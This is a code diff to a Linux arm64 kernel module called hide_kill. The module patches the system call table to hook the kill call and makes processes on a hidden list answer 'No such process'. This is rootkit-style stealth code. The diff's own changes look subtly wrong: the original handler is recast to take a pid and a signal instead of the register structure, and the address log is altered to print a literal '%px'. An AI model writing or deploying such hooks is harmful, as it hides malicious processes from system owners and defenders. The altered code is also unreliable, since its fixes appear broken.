@@ -10,7 +10,8 @@
 extern unsigned long * get_sys_call_table(void);
 
 // Storage for the original sys_kill function pointer
-static asmlinkage long (*original_sys_kill)(const struct pt_regs *);
+// The actual sys_kill function takes pid and sig, not pt_regs.
+static asmlinkage long (*original_sys_kill)(pid_t pid, int sig);
 
 // Pointer to the system call table
 static unsigned long **p_sys_call_table;
@@ -18,16 +19,23 @@ static unsigned long **p_sys_call_table;
 // Our hooked sys_kill function
 static asmlinkage long hooked_sys_kill(const struct pt_regs *regs)
 {
-    // On arm64, the first argument (pid) is in regs->regs[0]
+    // On arm64, arguments are in regs->regs[0], regs->regs[1], etc.
     pid_t pid = (pid_t)regs->regs[0];
+    int sig = (int)regs->regs[1];
 
     if (is_pid_hidden(pid)) {
         // Return "No such process"
         return -ESRCH;
     }
 
-    // If the pid is not hidden, call the original function
-    return original_sys_kill(regs);
+    // If the pid is not hidden, call the original function, but check if it's valid first
+    if (original_sys_kill) {
+        return original_sys_kill(pid, sig);
+    }
+
+    // Fallback if original_sys_kill is NULL
+    printk(KERN_WARNING "[hide_kill] original_sys_kill is NULL!\n");
+    return -ENOSYS;
 }
 
 int hide_kill_init(void)
@@ -40,7 +48,7 @@ int hide_kill_init(void)
         return -EFAULT;
     }
 
-    printk(KERN_INFO "[hide_kill] Found sys_call_table at %px\n", p_sys_call_table);
+    printk(KERN_INFO "[hide_kill] Found sys_call_table at %%px\n", p_sys_call_table);
 
     // Backup the original pointer
     original_sys_kill = (void *)p_sys_call_table[__NR_kill];
